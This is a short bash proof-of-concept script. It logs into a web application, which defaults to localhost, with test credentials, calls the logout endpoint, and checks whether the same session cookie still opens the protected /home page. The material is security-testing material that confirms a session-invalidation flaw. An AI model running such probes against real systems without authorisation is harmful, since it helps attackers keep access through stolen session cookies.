#!/bin/bash

# POC: Session Persistence After Logout Vulnerability
# This script demonstrates that session tokens remain valid after logout
# allowing attackers to continue accessing protected resources

TARGET_URL="${1:-http://localhost:5000}"
USERNAME="test"
PASSWORD="test"

echo "=========================================="
echo "Session Persistence After Logout POC"
echo "=========================================="
echo ""
echo "Target: $TARGET_URL"
echo ""

# Step 1: Login and capture session cookie
echo "[*] Step 1: Logging in with credentials ($USERNAME:$PASSWORD)..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
  -d "username=$USERNAME&password=$PASSWORD" \
  -L -w "\n%{http_code}")

HTTP_CODE=$(echo "$LOGIN_RESPONSE" | tail -n 1)
echo "[+] Login response code: $HTTP_CODE"

# Extract session cookie
SESSION_COOKIE=$(grep "session" /tmp/cookies.txt | awk '{print $NF}')
echo "[+] Session cookie obtained: $SESSION_COOKIE"
echo ""

# Step 2: Verify access to protected resource (/home) with session
echo "[*] Step 2: Accessing protected resource /home with session cookie..."
HOME_BEFORE=$(curl -s -b "/tmp/cookies.txt" "$TARGET_URL/home" -w "\n%{http_code}")
HTTP_CODE_BEFORE=$(echo "$HOME_BEFORE" | tail -n 1)
CONTENT_BEFORE=$(echo "$HOME_BEFORE" | head -n -1)

echo "[+] Response code: $HTTP_CODE_BEFORE"
if echo "$CONTENT_BEFORE" | grep -q "user\|User\|home\|Home"; then
  echo "[+] Successfully accessed protected resource (contains user data)"
else
  echo "[-] Could not access protected resource before logout"
fi
echo ""

# Step 3: Logout
echo "[*] Step 3: Calling logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -b "/tmp/cookies.txt" "$TARGET_URL/logout" -w "\n%{http_code}")
HTTP_CODE_LOGOUT=$(echo "$LOGOUT_RESPONSE" | tail -n 1)
echo "[+] Logout response code: $HTTP_CODE_LOGOUT"
echo ""

# Step 4: Attempt to access protected resource with the SAME session cookie
echo "[*] Step 4: Attempting to access /home AFTER logout with same session cookie..."
HOME_AFTER=$(curl -s -b "/tmp/cookies.txt" "$TARGET_URL/home" -w "\n%{http_code}")
HTTP_CODE_AFTER=$(echo "$HOME_AFTER" | tail -n 1)
CONTENT_AFTER=$(echo "$HOME_AFTER" | head -n -1)

echo "[+] Response code: $HTTP_CODE_AFTER"
echo ""

# Step 5: Analysis
echo "=========================================="
echo "VULNERABILITY ANALYSIS"
echo "=========================================="
echo ""

if [ "$HTTP_CODE_AFTER" = "200" ]; then
  echo "[!] VULNERABILITY CONFIRMED!"
  echo "[!] Session cookie still grants access after logout"
  echo "[!] Expected: 302 (redirect to login) or 401 (unauthorized)"
  echo "[!] Actual: $HTTP_CODE_AFTER (allowed)"
  echo ""
  echo "[!] This means:"
  echo "    - Session was NOT invalidated on logout"
  echo "    - Attacker with stolen session cookie can maintain access"
  echo "    - User cannot truly 'log out' their sessions"
  echo ""
  
  if echo "$CONTENT_AFTER" | grep -q "user\|User\|home\|Home"; then
    echo "[!] Session still contains user data:"
    echo "$CONTENT_AFTER" | head -c 200
    echo ""
  fi
  
  exit 0
else
  echo "[-] Session appears to have been invalidated"
  echo "[-] Response code: $HTTP_CODE_AFTER (expected for logout)"
  exit 1
fi